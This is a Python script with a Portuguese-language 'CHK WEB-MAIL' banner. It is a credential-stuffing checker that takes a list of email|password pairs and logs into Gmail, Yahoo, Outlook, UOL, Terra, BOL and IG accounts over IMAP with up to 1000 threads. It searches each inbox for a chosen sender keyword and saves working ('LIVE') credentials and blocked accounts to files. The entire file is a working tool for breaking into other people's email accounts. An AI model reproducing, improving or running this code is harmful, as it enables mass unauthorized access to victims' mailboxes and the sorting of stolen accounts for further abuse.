black = '\033[0;90m'
red = '\033[0;91m'
green = '\033[0;92m'
yellow = '\033[0;93m'
blue = '\033[0;94m'
purple = '\033[0;95m'
cyan = '\033[0;96m'
white = '\033[0;97m'
off = '\033[0m'
fgreen = '\033[42;97m'
fred = '\033[41;97m'
fblue = '\033[44;97m'
negro = '\e[1;30m'

import imaplib
import email
import concurrent.futures
import requests
from bs4 import BeautifulSoup
import getpass
import platform
import subprocess
from tkinter import *

banner = f""""{green}

                 CHK WEB-MAIL
    gmail - yahoo - uol - terra - hotmail - outlook
                 live - bol - ig  
        ⠀⠀⠀⠀⢀⠄⠀⠀⠀⠀⠀⠙⠛⢿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⣿⣆⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⡿⠁⠀⠀⠀⠀⠀⢤⣀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠙⣿⣿⣶⣤⣤⣤⣴⣾⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⢻⣷⣄⠀⠀⠀
        ⠀⠀⠀⠀⠀⠈⢿⣿⣿⠟⠋⢉⣉⣉⣙⣿⣷⣤⣾⡀⠀⠀⠀⠀⣸⣿⣿⣦⠀⠀
        ⠀⠀⢠⡄⠀⠀⣸⡿⠁⢀⣴⣿⣿⡿⢿⠿⣿⣿⣿⣷⣀⣀⣀⣴⣿⣿⣿⣿⡆⠀
        ⠀⠀⢸⣿⣷⣾⣿⡇⠀⠸⣿⣿⣿⡇⣀⠐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
        ⠀⠀⢸⣿⣿⣿⣿⣿⡀⠀⠙⠿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡉⠛⢻⣿⣿⣿⣿⣿⠀
        ⠀⠀⠈⣿⣿⣿⣿⣿⣷⣄⠀⠀⠈⠉⠁⠀⠘⠛⠿⠿⢉⣴⣤⣿⣿⣿⣿⣿⡿⠀
        ⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠁⠈⠙⠛⢿⣿⠃⠀  
        ⠀⠀⠀⠀⠹⣿⣿⣿⣿⡟⢻⠟⠁⣠⣦⣤⡀⠀⣀⣀⣀⡀⠀⠀⠀⢀⣾⠏⠀⠀  
        ⠀⠀⠀⠀⠀⠈⠻⣿⣧⡄⢠⣴⣾⣿⣿⣿⡄⠺⢿⣿⣿⣿⣶⣄⣴⡿⠃⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠿⣿⣿⣿⣿⣯⣤⣀⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀  
                Salamandra Center
                
┌════════════════════════┐
█ @JapaInCode {green}
└════════════════════════┘                                        
{off}"""
print(banner)

email_providers = {
    "gmail.com": {"imap_server": "imap.gmail.com", "port": 993},
    "yahoo.com": {"imap_server": "imap.mail.yahoo.com", "port": 993},
    "uol.com.br": {"imap_server": "imap.uol.com.br", "port": 993},
    "terra.com.br": {"imap_server": "imap.terra.com.br", "port": 993},
    "hotmail.com": {"imap_server": "imap-mail.outlook.com", "port": 993},
    "outlook.com": {"imap_server": "imap-mail.outlook.com", "port": 993},
    "outlook.com.br": {"imap_server": "imap-mail.outlook.com", "port": 993},
    "hotmail.com.br": {"imap_server": "imap-mail.outlook.com", "port": 993},
    "live.com": {"imap_server": "imap-mail.outlook.com", "port": 993},
    "live.com.br": {"imap_server": "imap-mail.outlook.com", "port": 993},
    "bol.com.br": {"imap_server": "imap.bol.com.br", "port": 993},
    "ig.com.br": {"imap_server": "imap.ig.com.br", "port": 993},
}

lista = input(f"{yellow}═>>> [digite o nome da sua lista]{off}:")

def search_email_for_subject(mailbox, message_id, subject):
    status, message_data = mailbox.fetch(message_id, "(RFC822)")
    if status == 'OK':
        raw_email = message_data[0][1]
        msg = email.message_from_bytes(raw_email)
        email_subject = msg.get('Subject', '')

        if subject.lower() in email_subject.lower():
            return True
    return False

def get_total_emails(mailbox):
    status, messages = mailbox.search(None, 'ALL')
    if status == 'OK':
        message_ids = messages[0].split()
        return len(message_ids)
    return 0

def get_provider_info(email):
    domain = email.split('@')[-1]
    provider_info = email_providers.get(domain)
    return provider_info


def check_email_with_executor(email, senha, search_subject):
    try:
        provider_info = get_provider_info(email)
        if provider_info is None:
            print(f"{fred}[Provedor Não Suportado]{off}: {red}{email}{off}")
            return

        imap_server = provider_info["imap_server"]
        port = provider_info["port"]
        
        if imap_server is None or port is None:
            print(f"{fred}[Provedor sem Configuração]{off}: {red}{email}{off}")
            return
        
        mailbox = imaplib.IMAP4_SSL(imap_server, port)
        mailbox.login(email, senha)
        mailbox.select('INBOX')

        status, messages = mailbox.search(None, 'NOT', 'DELETED')

        if status == 'OK':
            message_ids = messages[0].split()
            num_messages = len(message_ids)
        
        total_emails = get_total_emails(mailbox)
        
        found_subject = False
        for message_id in message_ids:
            if search_email_for_subject(mailbox, message_id, search_subject):
                print(f'{fgreen}[LIVE]{off}{green}{email}{off}', f'{yellow}Remetente Encontrado: ({search_subject})| Totais Encontrados: ({num_messages}){off}')
                with open(f"retornos/{search_subject}_encontrado.txt", "a") as file:
                    file.write(f"{email}|{senha}|Remetente encontrado:({search_subject})|Total de Emails:({total_emails})\n")
                found_subject = True
                break
        
        if not found_subject:
            print(f'{fgreen}[LIVE]{off}{green}{email}{off}', f'{red}Remetente NÃO Encontrado: ({search_subject})| Totais Encontrados: ({num_messages}){off}')
            with open("retornos/Logaram_sem_Remetente.txt", "a") as file:
                file.write(f"{email}|{senha}|Encontrada Totais:({num_messages})|Remetente não encontrada:({search_subject})|Total de Emails:({total_emails})\n")
        
        mailbox.logout()

    except imaplib.IMAP4.error as e:
        print(f"{fred}[DIE]{off}{red}{email}{off}")
        if "Account is blocked." in str(e):
            with open("login_block.txt", "a") as file:
                file.write(f"{email}|{senha}\n")
        
        mailbox.logout()

def main():
    with open(lista, "r", encoding="utf-8") as file:
        lines = file.readlines()

    unique_lines = []
    seen = set()

    for line in lines:
        if line not in seen:
            unique_lines.append(line)
            seen.add(line)

    with open(lista, "w", encoding="utf-8") as file:
        file.writelines(unique_lines)
    assunto_alvo = input(f"{green}[Palavra-Chave]{off}: ")

    num_processed = 0

    max_threads = 1000

    with concurrent.futures.ThreadPoolExecutor(max_threads) as executor:
        futures = []
        for line in unique_lines:  
            num_processed += 1
            parts = line.strip().split("|")
            if len(parts) == 2:
                email, senha = parts
                future = executor.submit(check_email_with_executor, email, senha, assunto_alvo)
                futures.append(future)
            else:
                print(f"{fred}Linha inválida{off}: {purple}{line.strip()}{off}")

        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()  
            except Exception as e:
                print(f"{red}[An exception occurred]{off}")
        
    print(f"{fgreen}Total de E-mails Processados:{off} {num_processed}")

if __name__ == "__main__":
    main()

